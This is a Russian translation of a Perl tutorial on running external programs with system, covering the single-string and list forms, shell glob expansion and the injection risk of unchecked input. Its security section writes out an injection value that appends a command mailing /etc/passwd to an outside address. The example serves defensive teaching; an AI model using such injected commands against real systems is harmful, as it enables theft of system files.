=title Запуск внешних программ из Perl с помощью system
=timestamp 2013-10-22T12:00:02
=indexes system
=status show
=original running-external-programs-from-perl
=books beginner_book
=author szabgab
=translator spidamoo
=archive 1
=comments 1
=social 1

=abstract start

Зачастую Perl используют как обертку вокруг других программ. Другими словами, мы запускаем внешние
программы из нашей Perl-программы.

Наприем, мы используем Perl, чтобы собрать нужные параметры, так что нам будет проще написать нужную
команду для запуска другой программы в командной строке.

Или нам может понядобиться собрать вывод в командной строке другой программы, и затем принять 
какие-то решения, основываясь на этом выводе.

Perl дает нам много разных решений для этого. Мы рассмотрим некоторые из них.

=abstract end

<h2>system</h2>

По-видимому самое простое из них - функция <hl>system</hl>. В самом базовом виде она принимает 
текст, который надо написать в командной строке, чтобы выполнить внешнюю команду.

Например, на машинах с Unix/Linux существует команда &laquo;adduser&raquo;, которая создает 
пользовательский аккаунт. Ее можно запустить так:

<hl>/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo</hl>

Так что, если нам надо выполнить ее из скрипта perl, это можно сделать так:

<code lang="perl">
  system('/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo');
</code>

Такой код запустит команду adduser. Любой вывод или ошибки, которые выдаст adduser, появятся на 
вашем экране.

Строку для выполнения можно сформировать динамически. Следующие примеры дадут тот же результат:

<code lang="perl">
  my $cmd = '/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo';
  system($cmd);
</code>

<code lang="perl">
  my $cmd = '/usr/sbin/adduser';
  $cmd .= ' --home /opt/bfoo';
  $cmd .= ' --gecos "Foo Bar" bfoo';
  system($cmd);
</code>

<h2>system с несколькими аргументами</h2>

Функция <hl>system</hl> может принимать больше одного аргумента. Пример выше можно было выполнить 
так:
<code lang="perl">
  my @cmd = ('/usr/sbin/adduser');
  push @cmd, '--home';
  push @cmd, '/opt/bfoo';
  push @cmd, '--gecos',
  push @cmd, 'Foo Bar',
  push @cmd, 'bfoo';
  system(@cmd);
</code>

В данном случае все показанные примеры работают одинаково, но в жизни эти подходы могут применяться
для разных целей.

<h2>Расширение оболочки</h2>

Предположим, у нас есть программа <b>checkfiles</b>, которая проверяет список файлов, переданный ей
в командной строке. Ее можно вызвать так: <b>checkfiles data1.txt data2.txt</b> или так: 
<b>checkfiles data*.txt</b>, чтобы проверить все файлы, название которых начинается с 
&laquo;data&raquo;, затем идут какие-то другие символы, и затем расширение &laquo;txt&raquo;. Этот
второй способ будет работать в системах Unix/Linux, где оболочка расширяет &laquo;data*.txt&raquo;
до списка всех файлов, которые подходят под это описание. Когда программа <b>checkfiles</b> 
выполняется, она уже видит список файлов: <b>checkfiles data1.txt data2.txt data42.txt 
database.txt</b>. Но не так это работает в Windows, где командная строка не делает этого расширения.
В Windows программа получит на вход &laquo;data*.txt&raquo;.

Причем тут наш скрипт Perl, спросите вы?

В Windows это не важно. Однако, в Unix/Linux, если вы запустите программу &laquo;checkfiles&raquo;
изнутри скрипта Perl одной строкой <hl>system("checkfiles data*.txt")</hl>, Perl передаст эту строку
оболочке. Оболочка выполнит свое расширение и программа &laquo;checkfiles&raquo; увидит список 
файлов. С другой стороны, если вы передадите саму команду и ее параметры в отдельных строках: 
<hl>system("checkfiles", "data*.txt")</hl>, то perl запустит непосредственно программу 
&laquo;checkfiles&raquo; и передаст ей один параметр &laquo;data*.txt&raquo;, не проводя расширения.

Как вы можете видеть, передача всей команды целиком в одной строке имеет свои преимущества.

Однако, эти преимущества не достаются бесплатно.

<h2>Риск безопасности</h2>

Вызов system с единственным параметром и передача всей команды таким способом может быть угрозой 
безопасности, если вводимые данные поступают из непроверенных источников. Например, прямо из 
веб-формы. Или из лог-файла, созданного веб-сервером.

Предположим, мы получаем параметры для checkfiles из сомнительного источника:

<code lang="perl">
  my $param = get_from_a_web_form();
  my $cmd = "checkfiles $param";
  system($cmd);
</code>

Если пользователь ввел в форме &laquo;data*.txt&raquo;, то все в порядке. Переменная <hl>$cmd</hl>
получит значение <hl>checkfile data*.txt</hl>.

С другой стороны, если пользователь подставит другие, более &laquo;хитрые&raquo; параметры, это 
может вызвать неприятности. Например, если пользователь напишет <hl>data*.txt; mail 
blackhat@perlmaven.com &lt; /etc/passwd</hl>, то команда, которую запустит perl, будет такой:
<hl>checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd</hl>.

Оболочка сначала выполнит команду &laquo;checkfile data*.txt&raquo;, как нам и нужно, но затем она 
пойдет дальше, и выполнит команду &laquo;mail...&raquo;. В результате ваш файл с паролями отправится
прямиком на темную сторону.

Если бы наш скрипт Perl вызывал <hl>system</hl> с несколькими параметрами, мы бы избежали этого 
риска. Если наш код такой:

<code lang="perl">
  my $param = get_from_a_web_form();
  my @cmd = ("checkfiles", $param);
  system(@cmd);
</code>

И пользователь вводит <hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>, то Perl 
запустит программу &laquo;checkfiles&raquo; и передаст ей один аргумент: <hl>data*.txt; mail 
blackhat@perlmaven.com &lt; /etc/passwd</hl>. Расширения оболочки не будет, но мы также избежим
ее опасностей. Команда &laquo;checkfiles&raquo;, возможно, пожалуется, что не может найти файл
<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>, но во всяком случае наши пароли
в безопасности.

<h2>Заключение и рекомендации к дальнейшему чтению</h2>

Более распространенный подход - собрать одну строку и передать ее функции <hl>system</hl>, но, если
входные данные поступают из сомнительного источника, это легко может стать направлением атаки. Риск
можно сократить, если сопоставлять входные данные с <b>белым списком</b> допутимых символов. Вы 
можете заставить себя всегда думать об этом, включив <b>taint mode</b> с помощью флага <hl>-T</hl> в
инициализирующей строке (sh-bang) вашего скрипта.

Вы можете узнать больще из 
<a href="http://perldoc.perl.org/functions/system.html">официальной документации по system</a>.

